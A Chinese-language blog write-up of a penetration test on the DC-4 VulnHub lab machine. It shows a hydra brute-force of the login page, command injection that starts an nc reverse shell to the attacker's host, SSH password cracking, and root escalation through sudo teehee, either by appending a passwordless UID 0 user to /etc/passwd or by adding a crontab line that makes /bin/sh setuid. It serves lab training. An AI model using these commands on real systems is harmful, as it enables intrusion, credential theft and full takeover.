---

title: DC_4靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false

---

# DC_4靶机渗透测试

[参考链接1](https://www.blacknight.top/2020/10/25/vulnhub_DC/#DC-4)

[参考链接2](https://www.anquanke.com/post/id/178658#h3-5)

[参考链接3]([DC4靶机渗透 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1803027?from=article.detail.1801074))

[参考链接4]([DC4-靶机_Au-CSDN博客](https://blog.csdn.net/Auuuuuuuu/article/details/100059696))



### 一、信息收集

- 扫描主机以及端口

[![R8FaCD.png](https://z3.ax1x.com/2021/06/26/R8FaCD.png)](https://imgtu.com/i/R8FaCD)

- 进入192.168.0.151：80

![image-20210626115918645](http://cdn.mxrblog.cn/image-20210626115918645.png)



- 可以看到上面说的是管理员信息系统登陆，于是以用户名为admin，用hydra进行密码爆破

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.151 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
```

![image-20210627222833305](http://cdn.mxrblog.cn/image-20210627222833305.png)

- 可以发现账号admin的密码是happy，登录一下看看，发现我们可以使用的几个命令

![image-20210627223132593](http://cdn.mxrblog.cn/image-20210627223132593.png)

![image-20210627232008658](http://cdn.mxrblog.cn/image-20210627232008658.png)



- 思路：网页上执行的是ls -l 命令，我们可以将网页发送的命令用brupsuite替换

![image-20210627231931042](http://cdn.mxrblog.cn/image-20210627231931042.png)

- 替换radio的参数为nc -e /bin/sh 192.168.0.145 4444

![image-20210628001837189](http://cdn.mxrblog.cn/image-20210628001837189.png)

![image-20210628001855516](http://cdn.mxrblog.cn/image-20210628001855516.png)

- 登录后获取交互式shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

- 得到home文件夹下有三个用户目录：charles，jim，sam ，并在jim用户下发现了密码本

![image-20210628004915269](http://cdn.mxrblog.cn/image-20210628004915269.png)

- 将密码本复制，并用hydra破解用户密码

```
hydra -L user -P userpwd -t 6  192.168.0.151 ssh
```

![image-20210628012451900](http://cdn.mxrblog.cn/image-20210628012451900.png)

- 登陆后发现有新邮件，进入、/var/mail查看

![image-20210628014055664](http://cdn.mxrblog.cn/image-20210628014055664.png)

- 发现邮件里的charles用户密码为^xHhA&hvim0y 进行登录
- 然后用sudo -l 发现charles可以使用的root命令teehee，用teehee –help发现这是将信息写入写出的工具

![image-20210628021417969](http://cdn.mxrblog.cn/image-20210628021417969.png)

- 用teehee向passwd添加用户

- `/etc/passwd` 各个字段的含义：

  ```
  username:password:User ID:Group ID:comment:home directory:shell
  ```

  密码我们直接置空，uid和gid都是0，也就是root用户，也就是说覆盖了root账户，密码为0

  写入用户

  ```
  echo "admin::0:0:::/bin/bash" |sudo teehee -a /etc/passwd
  ```

![image-20210628022918219](http://cdn.mxrblog.cn/image-20210628022918219.png)



- 另一种解决方法，向任务计划中添加任务



```
通过定时任务执行脚本提权，向/etc/crontab文件中写入新的定时任务

通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限

echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab 
时间部分全部填写为*，默认这个定时任务每分钟执行一次。

通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。
```



![image-20210628024031625](http://cdn.mxrblog.cn/image-20210628024031625.png)
